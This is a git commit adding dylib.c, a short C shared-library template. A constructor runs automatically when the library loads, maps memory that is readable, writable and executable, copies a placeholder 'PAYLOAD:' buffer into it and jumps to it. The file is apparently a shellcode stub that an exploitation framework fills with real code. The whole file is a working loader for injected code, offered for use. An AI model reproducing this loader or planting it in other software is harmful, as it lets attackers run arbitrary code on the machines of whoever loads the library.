59e2085046af80f1ff8a4accb5c3527bf71e19d1
Ivan Nikolsky <enty8080@gmail.com>
2022-06-04 22:44:04 +0200

    Create dylib.c

---
+++ dylib.c
@@ -0,0 +1,18 @@
+#include <string.h>
+#include <sys/mman.h>
+
+char payload[1024] = "PAYLOAD:";
+
+__attribute__ ((constructor))
+static int initializer() {
+    void *ptr = mmap(0, sizeof(payload), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+    if (ptr == MAP_FAILED)
+        return -1;
+
+    memcpy(ptr, payload, sizeof(payload));
+    int (*sc)() = ptr;
+    sc();
+
+    return 0;
+}
